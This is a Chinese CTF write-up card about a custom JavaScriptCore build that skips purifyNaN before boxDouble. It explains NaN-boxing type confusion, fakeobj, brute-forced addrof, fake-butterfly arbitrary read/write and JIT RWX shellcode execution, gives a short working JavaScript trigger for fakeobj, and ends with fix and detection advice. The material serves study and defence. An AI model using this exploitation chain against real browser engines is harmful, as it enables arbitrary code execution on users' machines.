---
id: binary-pwn-browser-jsc-boxdouble-purifynan-fakeobj-jit-rwx
title: JavaScriptCore boxDouble 漏掉 purifyNaN：NaN-boxing 类型混淆 fakeobj → addrof/任意读写 → JIT RWX 执行 shellcode
type: scenario
domain: binary
path: binary/pwn/browser
technique: jsc-boxdouble-missing-purifynan-fakeobj-jit-rwx
aliases:
- BadApple JSC
- boxDouble purifyNaN
- NaN boxing 类型混淆
- JavaScriptCore fakeobj
- JSC addrof 爆破
- JIT RWX shellcode
tags:
- browser
- javascriptcore
- jsc
- jit
- type-confusion
- nan-boxing
- fakeobj
- addrof
- arbitrary-read-write
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V483
  verified_at: '2026-11-10T20:58:38+08:00'
  notes: 已对照原文核对：diff 去掉 purifyNaN 直接 boxDouble、trigger 预热与 0xfffe0000_12345678 触发、addrof 爆破/伪造 butterfly/JIT RWX 与 exp.min.js 一致；完整 exp 未复跑
---

## 一句话结论

魔改的 JavaScriptCore 在把 double 装箱成 JSValue 时删掉了 `purifyNaN`、直接调用 `boxDouble`，攻击者可控的 NaN 位模式（如 `0xfffe000012345678`）因此不再被规范化，而被 JSC 当作指针标签解释；配合 `Float64Array` 读写与属性赋值即可得到 fakeobj 原语，再用 fakeobj + `===` 爆破 addrof、伪造 butterfly 实现任意读写，最后把 shellcode 写进 JIT 的 RWX 区域执行。

## 原理

- **NaN-boxing**：64 位 JSC 用 IEEE754 double 表示数字，非数字值（对象指针等）用特定 NaN 位模式编码，常见约定是高 16 位为 `0xfffe`/`0xffff`；`boxDouble` 负责把 double 装箱为 JSValue。
- **purifyNaN 的作用**：合法 NaN 有大量位模式，若原样保留，攻击者构造的 NaN 可能恰好落在“指针标签”区间，导致同一个 64 位值在不同路径被分别当成 double 和对象。`purifyNaN` 把 NaN 统一成规范位模式，消除这种歧义。
- **漏洞**：diff 显示补丁去掉了对 `purifyNaN` 的调用，`boxDouble` 输入完全可控；当把 `Float64Array` 元素（double）经属性赋值写入对象属性时，JSC 保留攻击者的位模式；随后读取该属性，值被当作 JSValue 对象指针（fakeobj）。
- **触发稳定性**：`for...in` 循环里把被遍历对象替换为 `[1]`，让属性访问走通用路径；先用普通对象预热，再用 `Float64Array` 反复触发，最后写入 `0xfffe0000_12345678n` 并读取属性，得到指向伪造地址的“对象”。
- **addrof**：JSC 的 `===` 比较的是 JSValue；把候选地址作为 fakeobj 与目标对象比较，命中即得到目标对象地址。Ubuntu 20.04 上堆地址低 24 位可预测，按 `0x1000000` 步长扫描可快速爆破。
- **任意读写**：在 JS 堆上布置 `{c:1.1,d:2.2}` 与带数组元素的假对象，控制假对象的 butterfly 指针，使 `fake_obj[i]` 实际读写任意地址；配合 `ArrayBuffer`/`BigUint64Array` 在 double 与整数间转换。
- **JIT RWX**：读出 JIT 函数的代码地址（函数对象 +0x18/+0x8/+0x10 链）后可写 shellcode 到 RWX 页并调用，完成任意代码执行。

## 触发条件

- 目标运行存在该补丁差异的 JavaScriptCore（本题为 CTF 定制版本），且攻击者能执行任意 JS。
- 目标地址空间 ASLR 低 24 位与爆破假设相符（题目环境 Ubuntu 20.04）。
- JIT 已启用且代码页 RWX（或可绕过 W^X）。
- 需要稳定的堆布局，通常要多次触发与预热。

## 利用步骤

1. 用 `ArrayBuffer` 同时建立 `BigUint64Array` 与 `Float64Array` 视图，便于 double/整数互转。
2. 用 `trigger(obj,t)` 预热属性访问路径，再循环 `trigger(fbuf,t)` 让 `Float64Array` 元素进入装箱路径。
3. 写入 `0xfffe0000_12345678n` 后读取 `t.x`，确认得到 fakeobj（可打印其属性/类型验证）。
4. 用 fakeobj 与 `===` 按候选地址扫描目标对象，爆破出 fake 对象地址（addrof）。
5. 在 JS 堆布置假对象与 butterfly，构造 `addrof`/`read64`/`write64` 原语。
6. 通过 `addrof(bftrigger)` 链式读出 JIT 代码页地址（函数对象字段链），把 shellcode 写入 RWX 区域并调用。
7. 远程利用时先过 PoW，再把 `exp.min.js` 发送给服务端执行，最后 `cat /flag*`。

## PoC

```javascript
let abuf = new ArrayBuffer(0x10);
let bbuf = new BigUint64Array(abuf);
let fbuf = new Float64Array(abuf);
obj = {x:1234, y:1234};

function trigger(arg, a2) {
    for (let i in obj) {
        obj = [1];
        let out = arg[i];
        a2.x = out;          // 保留攻击者可控的 NaN 位模式
    }
}

let t = {x: {}};
trigger(obj, t);                       // 预热
for (let i = 0; i < 0x1000; i++) trigger(fbuf, t);
bbuf[0] = 0xfffe0000_12345678n;        // 伪造对象指针
trigger(fbuf, t);
t.x;                                   // 被当作对象解释 → fakeobj
```

完整的 addrof/任意读写/JIT 写入逻辑见原文 exp.min.js；远程发送脚本为 exp.py（含 SHA256 PoW 求解）。

## 变体与关联

- 变体：不同引擎的 NaN-boxing 约定不同（JSC 与 V8 的指针标签、SMI 编码不同），但“未规范化 NaN/浮点值跨类型解释”这一根因可迁移。
- 变体：addrof 还可用 `WeakMap`、`Array.prototype.indexOf` 等侧信道；本卡用 `===` 配合可预测低 24 位。
- 关联：V8 上通过 elements map 校验缺口构造 OOB 与 addrof/fakeobj 的思路见 [[binary-pwn-browser-v8-oob-length-overwrite-bypass-elements-map-check-addrof-fakeobj]]；JIT RWX 写入属于通用浏览器利用收尾。
- 边界：原文只给出题目定制 patch 的 diff 表述与 exp，未给出完整 JSC 源码上下文；exp 依赖特定堆布局与地址范围，换环境需重新标定。

## 检测与防御

- 修复：恢复 `boxDouble` 前的 `purifyNaN` 调用，确保所有 NaN 在装箱前规范化；为 JIT 代码页启用 W^X。
- 加固：启用 JSC 的 Gigacage/StructureID 随机化与指针认证（若有）；限制可执行 JS 的来源。
- 检测：异常 `0xfffe` 前缀的浮点值、类型混淆导致的崩溃、JIT 页写入行为；浏览器沙箱内的异常 RWX 调用。
